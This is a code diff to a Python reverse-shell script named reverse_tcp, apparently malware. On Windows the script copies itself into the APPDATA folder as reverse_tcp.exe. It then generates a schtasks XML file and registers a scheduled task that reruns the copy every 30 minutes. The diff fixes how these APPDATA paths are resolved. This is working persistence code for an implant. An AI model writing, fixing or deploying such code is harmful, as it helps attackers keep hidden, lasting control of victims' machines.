@@ -12,6 +12,7 @@
 import socket, subprocess, os, platform, sys
 
 
+
 '''
    generate xml content according to schtasks_template.xml
    for schtasks program hack (windows only)
@@ -58,31 +59,34 @@ def generateScheduleTask(schedule_interval_minutes):
   </Settings>
   <Actions Context="Author">
     <Exec>
-      <Command>%Appdata%\\reverse_tcp.exe</Command>
+      <Command>""" + os.getenv("APPDATA") +  """\\reverse_tcp.exe</Command>
     </Exec>
   </Actions>
 </Task>
     """
 
 if (platform.system() == "Windows"):
-    target_path = "%Appdata%\\reverse_tcp.exe"   ## target path, this program will copy itself to that path
+    ### Get APPDATA path
+    appdata_path = os.getenv("APPDATA");
+    target_path = appdata_path + "\\reverse_tcp.exe"   ## target path, this program will copy itself to that path
     current_path = os.path.abspath(__file__)
     ### Check whether file already copied to %Appdata%\reverse_tcp.exe
     if os.path.isfile(target_path): # already exists, do nothing
         pass
     else:
+
         ### Create schtasks_template.xml
         with open("%Appdata%\\schtasks_template.xml", "w") as xml:
             xml.write(generateScheduleTask(30))  ## interval 30 minutes
             # xml.close()
 
         ### Copy self to %Appdata% for Windows. (%Appdata%\reverse_tcp.exe)
-        os.system("copy " + current_path + " %Appdata%\\reverse_tcp.exe")
+        os.system("copy " + current_path + " " + target_path)
 
         ### Setup schtasks for Windows.
         ### Run every 30 minutes.
         ### The the name of schedule task is reverse_tcp
-        os.system("schtasks /CREATE /XML %Appdata%\\schtasks_template.xml /TN reverse_tcp")
+        os.system("schtasks /CREATE /XML " + appdata_path + "\\schtasks_template.xml /TN reverse_tcp")
         ## os.system("schtasks /CREATE /SC MINUTE /MO 30 /TN reverse_tcp /TR %Appdata%\\reverse_tcp.exe")
 
 
